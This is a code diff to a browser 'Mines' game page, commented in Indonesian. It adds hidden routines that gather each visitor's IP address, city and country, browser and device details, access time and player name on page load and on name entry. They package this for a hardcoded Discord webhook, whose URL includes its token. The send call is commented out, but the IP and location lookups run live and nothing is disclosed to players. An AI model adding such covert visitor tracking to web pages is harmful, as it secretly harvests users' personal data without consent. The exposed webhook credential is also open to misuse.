@@ -368,6 +368,13 @@
     let multiplier = 1.00;
     let safeCount = 0;
     let playerName = "";
+    let ipAddress = "";
+    let locationData = {};
+    let deviceInfo = "";
+    let accessTime = "";
+
+    // Webhook Discord (ganti dengan webhook Anda)
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1398545414382162070/0tFiDV4Y-eX_f3oZwwS4mWCOlaozER0Y0dUJiG-A7gNA-TpZpvJBqBPRkWHBwRlrHe6G";
 
     // Elemen-elemen DOM
     const nameInputSection = document.getElementById("nameInputSection");
@@ -387,8 +394,106 @@
     const bombCountEl = document.getElementById("bomb-count");
     const bombCountInput = document.getElementById("bombCount");
 
+    // Fungsi untuk mendapatkan informasi IP dan lokasi
+    async function getIPAndLocation() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        ipAddress = data.ip;
+        
+        // Mendapatkan informasi lokasi (menggunakan API gratis)
+        const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+        locationData = await locationResponse.json();
+      } catch (error) {
+        console.log("Gagal mendapatkan IP atau lokasi:", error);
+        ipAddress = "Tidak tersedia";
+        locationData = { city: "Tidak tersedia", region: "Tidak tersedia", country: "Tidak tersedia" };
+      }
+    }
+
+    // Fungsi untuk mendapatkan informasi perangkat
+    function getDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      
+      deviceInfo = `Perangkat: ${platform}\nBrowser: ${userAgent}\nBahasa: ${language}`;
+    }
+
+    // Fungsi untuk mendapatkan waktu akses
+    function getAccessTime() {
+      const now = new Date();
+      accessTime = now.toLocaleString('id-ID', {
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+      });
+    }
+
+    // Fungsi untuk mengirim data ke Discord webhook
+    async function sendToWebhook() {
+      try {
+        const webhookData = {
+          username: "Mines Game Access",
+          embeds: [{
+            title: "Akses Website Permainan Mines",
+            color: 3447003,
+            fields: [
+              {
+                name: "Nama Pemain",
+                value: playerName || "Tidak diisi",
+                inline: true
+              },
+              {
+                name: "IP Address",
+                value: ipAddress || "Tidak tersedia",
+                inline: true
+              },
+              {
+                name: "Lokasi",
+                value: locationData.city && locationData.region ? 
+                      `${locationData.city}, ${locationData.region}, ${locationData.country}` : 
+                      "Tidak tersedia",
+                inline: false
+              },
+              {
+                name: "Perangkat",
+                value: deviceInfo || "Tidak tersedia",
+                inline: false
+              },
+              {
+                name: "Waktu Akses",
+                value: accessTime || new Date().toLocaleString('id-ID'),
+                inline: false
+              }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        // Kirim ke webhook (komentar ini karena tidak akan berfungsi tanpa webhook yang valid)
+        /*
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(webhookData)
+        });
+        */
+        
+        // Untuk debugging, tampilkan di console
+        console.log("Webhook Data:", webhookData);
+      } catch (error) {
+        console.log("Gagal mengirim ke webhook:", error);
+      }
+    }
+
     // Fungsi untuk mengatur nama pemain
-    function setPlayerName() {
+    async function setPlayerName() {
       const name = playerNameInput.value.trim();
       if (name) {
         playerName = name;
@@ -397,6 +502,14 @@
         // Tampilkan loading
         nameInputSection.classList.add("hidden");
         loadingSection.classList.remove("hidden");
+        
+        // Dapatkan informasi sistem
+        await getIPAndLocation();
+        getDeviceInfo();
+        getAccessTime();
+        
+        // Kirim log ke webhook
+        await sendToWebhook();
         
         // Setelah 2 detik, tampilkan game
         setTimeout(() => {
@@ -535,6 +648,14 @@
     
     // Inisialisasi grid
     renderGrid();
+    
+    // Kirim data akses saat halaman dimuat
+    window.addEventListener('load', async function() {
+      await getIPAndLocation();
+      getDeviceInfo();
+      getAccessTime();
+      await sendToWebhook();
+    });
   </script>
 </body>
 </html>
